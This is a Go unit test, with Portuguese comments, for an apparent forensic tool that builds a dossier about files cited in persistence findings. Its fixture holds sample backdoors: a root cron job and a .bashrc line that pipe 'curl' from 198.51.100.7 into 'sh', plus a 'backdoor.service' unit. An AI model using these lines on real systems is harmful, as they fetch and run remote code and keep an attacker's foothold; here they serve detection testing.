package info

import (
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/facts"
)

// O DOSSIÊ ALCANÇA O ARTEFATO QUE O ACHADO CITA.
//
// O bloco "QUEM MANDA EXECUTAR" pergunta quem executa este arquivo, casando o
// caminho contra o COMANDO de cada agendamento. Ninguém perguntava se o caminho
// É a fonte: um `/etc/cron.d/telemetry` respondia "este caminho não aparece em
// nada que esta coleta examinou" — sobre o arquivo que `persist.cron_suspect`
// nomeia como evidência.
//
// A lacuna apareceu num teste com cliente MCP real: o modelo achou o cron
// backdoor, perguntou pelo arquivo, e recebeu found:false. É a próxima pergunta
// depois de um achado de persistência, e o dossiê não alcançava a conclusão que
// ele mesmo tinha entregado.
func TestDossieAlcancaAFonteDoAgendamento(t *testing.T) {
	f := &facts.Facts{
		Cron: []facts.CronEntry{{
			File: "/etc/cron.d/telemetry", Kind: "dropin", User: "root",
			Schedule: "* * * * *",
			Cmd:      `/bin/sh -c "curl -s http://198.51.100.7/p | sh"`,
		}},
		Units: []facts.Unit{{
			Name: "backdoor.service", Path: "/etc/systemd/system/backdoor.service",
			Kind: "service", Scope: "system",
			Exec: []facts.ExecLine{{Key: "ExecStart", Cmd: "/tmp/.x/agent --daemon"}},
		}},
		Triggers: []facts.Trigger{{
			File: "/root/.bashrc", Kind: "shell_rc", When: "login",
			Lines: []facts.TriggerLine{{N: 19, Text: "curl -s https://198.51.100.7/i.sh | sh"}},
		}},
	}
	f.Index()

	casos := []struct{ caminho, esperado string }{
		{"/etc/cron.d/telemetry", "198.51.100.7"},
		{"/etc/systemd/system/backdoor.service", "/tmp/.x/agent"},
		{"/root/.bashrc", "i.sh"},
	}
	for _, c := range casos {
		d := Arquivo(f, c.caminho)
		if !d.Achou {
			t.Errorf("%s: found=false sobre o arquivo que o próprio achado cita "+
				"como evidência", c.caminho)
			continue
		}
		var bloco *Bloco
		for i := range d.Blocos {
			if d.Blocos[i].Titulo == "O QUE ESTE ARQUIVO DEFINE" {
				bloco = &d.Blocos[i]
			}
		}
		if bloco == nil {
			t.Errorf("%s: sem o bloco que responde o que o arquivo define", c.caminho)
			continue
		}
		var tudo string
		for _, l := range bloco.Linhas {
			tudo += l.Rotulo + " " + l.Valor + " " + l.Nota + " "
		}
		if !strings.Contains(tudo, c.esperado) {
			t.Errorf("%s: o bloco não diz o que ele define (falta %q): %s",
				c.caminho, c.esperado, tudo)
		}
	}

	// E um caminho que NÃO define nada continua respondendo a ausência com o
	// aviso de que ausência não é inexistência.
	d := Arquivo(f, "/etc/hosts")
	if d.Achou {
		t.Error("/etc/hosts não define agendamento nenhum nesta fixture")
	}
}
